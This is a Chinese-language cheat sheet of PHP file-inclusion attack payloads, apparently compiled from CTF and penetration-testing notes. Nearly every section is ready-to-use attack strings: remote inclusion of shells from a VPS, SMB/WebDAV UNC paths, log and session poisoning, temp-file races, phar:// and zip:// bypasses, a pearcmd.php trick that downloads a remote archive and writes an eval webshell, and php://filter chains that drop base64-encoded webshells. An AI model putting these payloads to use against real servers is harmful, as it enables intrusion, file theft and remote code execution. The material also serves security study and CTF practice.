## 一、allow\_url\_include 开启（双 On）

条件: `allow_url_fopen=On`（默认开）+ `allow_url_include=On`（PHP 5.2 后默认关）

```php
?file=http://vps/shell.txt                          # 远程包含
?file=data://text/plain;base64,PD9waHAgcGhwaW5mbygpPz4=   # data 协议
?file=php://input                                   # POST: <?php system('ls');?>
```

出处: `文件包含.md` L531-L574

VPS 起 http 服务: `python3 -m http.server 8080`

## 二、双 Off 也能打（Windows 专属）

`allow_url_include=Off` 时 PHP 不加载 http/ftp URL，但**没有禁止 SMB**.

### 2.1 UNC → SMB（匿名共享）

```plain
?file=\\192.168.1.104\ethan\shell.php
```

VPS 上装 samba，配 `guest ok = yes` 匿名共享，放 webshell 即可被包含。\
出处: `文件包含.md` L594-L670

### 2.2 UNC → WebDAV

```plain
?file=//193.43.142.8//webdav/shell.php
```

WebDAV 共享文件不能被直接附加消息，所以 shell.php 内容写成**自生成马**:

```php
<?php fputs(fopen('poc.php','w'),'<?php @eval($_POST[Qftm])?>');?>
```

出处: `文件包含.md` L672-L780

## 三、包含可控文件（无条件，最有实战价值）

### 3.1 日志包含

```bash
# 1. 把 webshell 写进 User-Agent，访问一次
# 2. 包含日志文件
?file=/var/log/apache2/access.log
?file=/var/log/nginx/access.log
?file=/var/log/apache2/error.log
?file=C:\phpStudy\Apache\logs\error.log      # Windows phpstudy 高权限
```

出处: `文件包含.md` L782-L1292

### 3.2 Session 包含

```plain
# 1. 注册时将用户名设为 webshell 内容
# 2. 包含 session 文件
?file=/tmp/sess_xxxxxxxx
?file=/var/lib/php/sessions/sess_xxxxxxxx
```

出处: `文件包含.md` L18-L90

### 3.3 临时文件包含（strip\_tags 触发段错误）

```php

# 然后用脚本遍历 /tmp/phpXXXXXX 包含
```

## 四、phpinfo + LFI 临时文件竞争 ★

**原理**: phpinfo 页面泄露 `$_FILES[file][tmp_name]`，赶在临时文件被删除前包含它。

```plain
Linux:   /tmp/php[6个随机字符]
Windows: C:/Windows/php[4个随机字符].tmp
```

流程: 并发请求 phpinfo 拿 tmp\_name + 并发请求 LFI 包含该临时文件。\
出处: `文件包含.md` L1411-L1492

## 五、后缀被拼接时的绕过

场景: `include($_GET['f'].'.php');` 且上传点只能传图片

### 5.1 phar:// 协议（最常用，Windows/Linux 通用）

```plain
# 把 shell.php 打包成 zip，改名为 shell.png 上传
?file=phar://shell.png/shell
```

phar 根据文件头判断是否压缩包，改后缀不影响解析。\
出处: `文件包含.md` L1371

### 5.2 zip:// 协议（Windows）

```plain
?file=zip://E:/phpstudy_pro/WWW/shell.png%23shell
# 需绝对路径，%23 后跟压缩包内文件名
```

出处: `文件包含.md` L1357

### 5.3 截断绕过（老版本 PHP）

```plain
/etc/passwd%00            # %00 截断（PHP<5.3.4, magic_quotes_gpc=off）
/etc/passwd/./././.../    # 路径长度截断（Linux>4096, Windows>256）
/boot.ini/............... # 点号截断（仅 Windows，点号>256）
```

出处: `文件包含.md` L1391-L1409

## 六、pearcmd.php 裸文件包含 ★（Docker 环境）

场景: 只有 LFI，无任何上传点。

```bash
# 利用 pear install 写文件
/?file=/usr/local/lib/php/pearcmd.php&+install+-R+/tmp+http://vps/shell.tar
# 或用 config-create 写配置
/?+config-create+/&file=/usr/local/lib/php/pearcmd.php&/<?=eval($_POST[1]);?>+/tmp/shell.php
```

条件: PHP 官方 Docker 镜像默认打了 pear，且 `register_argc_argv=On`。\
出处: `文件包含.md` L383；网络补充 "pearcmd 裸文件包含"

## 七、PHP 伪协议速查

```php
# 读文件（最常用）
php://filter/read=convert.base64-encode/resource=flag.php
php://filter/convert.base64-encode/resource=flag.php

# 代码执行（需 allow_url_include=On）
php://input        # POST: <?php system('ls');?>
data://text/plain;base64,PD9waHAgcGhwaW5mbygpPz4=

# 嵌套过滤器
php://filter/string.rot13/resource=php://filter/convert.base64-encode/resource=flag.php

# 其他协议
file:///etc/passwd
zip://shell.zip#shell
phar://shell.phar/shell
```

### 死亡 exit() 绕过（`file_put_contents($file, '<?php exit();?>'.$content)`）

```php
# 法1: base64-decode（推荐）— exit() 中特殊字符被 base64 解码忽略
php://filter/convert.base64-decode/resource=shell.php

# 法2: iconv 编码链
php://filter/PD9waHAgQGV2YWwoJF9QT1NUWydhJ10pOz8+|convert.iconv.utf-8.utf-7|convert.base64-decode/resource=shell.php

# 法3: strip_tags（PHP<7.3）
php://filter/string.strip_tags/resource=?>/../shell.php

# 法4: 压缩解压链
php://filter/zlib.deflate|string.tolower|zlib.inflate|?><?php%0dphpinfo();?>/resource=shell.php
```

出处: `PAYLOAD-CHEATSHEET.md` L266-L284

## 八、上传 + 包含组合 ★

```plain
# 情况1: 任意文件包含 → 直接包含上传的图片马
?file=HY.png

# 情况2: 后缀限制 (include($f.".php"))
# 上传点只允许 .jpg/.png/.gif
# → 打包马改名为图片上传 → phar:// / zip:// 包含
?file=phar://shell.png/shell
```

出处: `文件包含.md` L1293-L1408

## 九、php 代码中使用 php://filter 的 strip\_tags

> `php://filter/string.strip_tags` 让 PHP 执行时直接段错误，垃圾回收机制不继续执行，\
> POST 的文件会保存在系统缓存目录不被清除。此时只需知道文件名即可包含恶意代码 getshell。\
> 出处: `文件包含.md` L88
